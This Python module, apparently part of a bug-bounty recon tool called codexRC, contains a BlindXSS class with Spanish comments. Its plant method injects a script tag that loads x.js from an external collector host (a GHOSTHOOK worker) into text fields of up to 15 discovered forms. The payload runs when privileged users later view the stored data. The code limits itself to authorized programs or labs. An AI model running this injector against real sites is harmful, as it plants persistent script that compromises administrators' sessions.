"""
codexRC - BlindXSS
"""

from typing import Any, Callable, Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse
import re
import json
import secrets
import time
import concurrent.futures

import requests
from bs4 import BeautifulSoup

from core.hunter_base import (
    Log, SKIP_EXT, JS_SINK_RE, JS_SOURCE_RE, JS_ENDPOINT_RE,
    FORM_INPUT_TYPES, _norm,
)

class BlindXSS:
    """Siembra payloads GHOSTHOOK en campos de texto de formularios para que
    se ejecuten cuando un usuario con privilegios abra la vista (blind XSS).
    ESCRIBE en el objetivo: solo activarla en programas que permiten stored o
    blind XSS, o en laboratorios propios. Nunca se auto-ejecuta."""
    def __init__(self, session: requests.Session, log: Log,
                 delay: float = 0.15, timeout: float = 15.0):
        self.session = session
        self.log = log
        self.delay = delay
        self.timeout = timeout

    def plant(self, spider_out: Dict[str, Any], endpoint: str,
              max_forms: int = 15) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        if not endpoint:
            self.log("[blind] sin blind_endpoint: pasa la URL del worker "
                     "GHOSTHOOK (ej. https://ghosthook.xxx.workers.dev) para "
                     "activar esta bateria")
            return findings
        self.log("[blind] === bateria BLIND (ESCRIBE en el blanco): solo "
                 "programas con stored/blind XSS permitido o labs propios ===")
        payload = f'<script src="{endpoint.rstrip("/")}/x.js"></script>'
        forms = spider_out.get("forms", [])[:max_forms]
        if not forms:
            self.log("[blind] sin formularios descubiertos: nada que sembrar")
            return findings
        for form in forms:
            fields = [f for f in form.get("fields", [])[:8]]
            if not fields:
                continue
            field = max(fields, key=len)  # campo de texto mas largo
            data = {x: "x" for x in fields}
            data[field] = payload
            time.sleep(self.delay)
            try:
                if form["method"].upper() == "POST":
                    r = self.session.post(form["url"], data=data,
                                          timeout=self.timeout)
                else:
                    r = self.session.get(form["url"], params=data,
                                          timeout=self.timeout)
                status = r.status_code
            except Exception as exc:
                self.log(f"[blind] XX {urlparse(form['url']).path} · {str(exc)[:60]}")
                continue
            findings.append({
                "severity": "info", "type": "Blind XSS sembrado",
                "param": field, "target": form["url"],
                "evidence": f"payload GHOSTHOOK inyectado en '{field}' "
                            f"({form['method'].upper()} · HTTP {status})",
                "verdict": "esperar beacons en el panel del colector; "
                           "reportar solo si el programa acepta blind/stored XSS"})
            self.log(f"[blind] sembrado en '{field}' @ "
                     f"{urlparse(form['url']).path} (HTTP {status})")
        self.log(f"[blind] BLIND terminado · {len(findings)} siembras; "
                 "los beacons llegan al panel del worker")
        return findings
